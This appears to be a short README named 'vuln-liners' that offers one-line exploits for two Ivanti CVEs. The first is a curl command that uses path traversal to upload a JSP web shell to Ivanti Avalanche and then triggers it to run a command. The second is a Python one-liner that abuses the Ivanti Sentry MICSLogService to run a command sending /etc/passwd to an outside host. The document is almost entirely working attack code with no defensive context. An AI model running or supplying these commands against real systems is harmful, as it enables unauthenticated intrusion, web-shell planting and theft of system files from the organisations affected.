# vuln-liners
One line vulnerabilities

## CVE-2023-32563 (Ivanti Avalanche Pre-auth)
`curl -v http://x.x.x.x:1900/Servlet/Skins -F guid=../../../Web/webapps/ROOT -F "file=@-;filename=x.jsp" <<<'<%Runtime.getRuntime().exec(request.getParameter("c"));%>' -: -k https://x.x.x.x:8443/x.jsp -d c=mspaint.exe`

## CVE-2023-38035 (Ivanti Sentry API Authentication Bypass)
`python3 -c "from pyhessian.client import HessianProxy as H; H('https://TARGET-DOMAIN:8443/mics/services/MICSLogService').uploadFileUsingFileInput({'command': 'curl -X POST -d @/etc/passwd https://x.x.x.x', 'isRoot': True}, None)"`
